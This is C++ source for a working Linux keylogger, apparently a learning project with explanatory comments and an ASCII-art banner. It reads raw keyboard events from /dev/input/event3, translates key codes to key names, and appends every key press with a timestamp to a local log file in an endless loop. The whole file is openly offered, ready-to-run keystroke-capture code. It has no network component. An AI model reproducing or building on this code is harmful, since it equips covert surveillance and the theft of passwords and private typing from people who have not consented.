#include <iostream>
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>
#include <map>
#include <fstream>
#include <ctime>
using namespace std;

int main(){
    cout << R"(
/$$                                               
| $$                                               
 /$$$$$$$ /$$   /$$| $$$$$$$   /$$$$$$$        /$$  /$$$$$$   /$$$$$$ 
/$$_____/| $$  | $$| $$__  $$ /$$_____//$$$$$$|__/ /$$__  $$ /$$__  $$
| $$      | $$  | $$| $$  \ $$|  $$$$$$|______/ /$$| $$  \ $$| $$$$$$$$
| $$      | $$  | $$| $$  | $$ \____  $$       | $$| $$  | $$| $$_____/
|  $$$$$$$|  $$$$$$$| $$$$$$$/ /$$$$$$$/       | $$|  $$$$$$/|  $$$$$$$
 \_______/ \____  $$|_______/ |_______/        | $$ \______/  \_______/
           /$$  | $$                      /$$  | $$                    
          |  $$$$$$/                     |  $$$$$$/                    
           \______/                       \______/
)" << endl;

    bool con = true; //condition for loop to continue
    struct input_event ev; // this is a standard linux data structure used to represent events
    int fd = open("/dev/input/event3",O_RDONLY); //here I used open and put in it the path and use O_RDONLY for reading file only
    fstream write;
    map<int ,string> keymap; // this is a library that keycodes charcaters
    keymap[1]= "ESC";
    keymap[2]= "1";
    keymap[3]= "2";
    keymap[4]= "3";
    keymap[5]= "4";
    keymap[6]= "5";
    keymap[7]= "6";
    keymap[8]= "7";
    keymap[9]= "8";
    keymap[10]= "9";
    keymap[11]= "0";
    keymap[12]= "-";
    keymap[13]= "=";
    keymap[14]= "Backspace";
    keymap[15]= "Tab";
    keymap[16] = "Q";
    keymap[17] = "W";
    keymap[18] = "E";
    keymap[19] = "R";
    keymap[20] = "T";
    keymap[21] = "Y";
    keymap[22] = "U";
    keymap[23] = "I";
    keymap[24] = "O";
    keymap[25] = "P";
    keymap[26] = "[";
    keymap[27] = "]";
    keymap[28] = "Enter";
    keymap[29] = "LeftCtrl";
    keymap[30] = "A";
    keymap[31] = "S";
    keymap[32] = "D";
    keymap[33] = "F";
    keymap[34] = "G";
    keymap[35] = "H";
    keymap[36] = "J";
    keymap[37] = "K";
    keymap[38] = "L";
    keymap[39] = ";";
    keymap[40] = "'";
    keymap[41] = "GRAVE";
    keymap[42] = "LEFT SHIFT";
    keymap[43] = "BACKSLASH";
    keymap[44] = "Z";
    keymap[45] = "X";
    keymap[46] = "C";
    keymap[47] = "V";
    keymap[48] = "B";
    keymap[49] = "N";
    keymap[50] = "M";
    keymap[51] = ",";
    keymap[52] = ".";
    keymap[53] = "SLASH";
    keymap[54] = "RIGHTSHIFT";
    keymap[55] = "KPASTERISK";
    keymap[56] = "LEFTALT";
    keymap[57] = "SPACE";
    keymap[58] = "CAPSLOCK";
    keymap[59] = "F1";
    keymap[60] = "F2";
    keymap[61] = "F3";
    keymap[62] = "F4";
    keymap[63] = "F5";
    keymap[64] = "F6";
    keymap[65] = "F7";
    keymap[66] = "F8";
    keymap[67] = "F9";
    keymap[68] = "F10";
    keymap[69] = "NUMLOCK";


     write.open("keylog1.txt" , ios::app); // this line creates file and appends to it when keylogger is on

    while(con == true){
        read(fd , &ev , sizeof(ev)); // so am using read to read from fd and put it in &ev
        if(ev.type == EV_KEY && ev.value == 1){
            time_t now = time(nullptr);
            write << ctime(&now) << keymap[ev.code] << endl; // this part for writing in file it includes time for each letter 
            write.flush(); 
        }
    }
    write.close();
}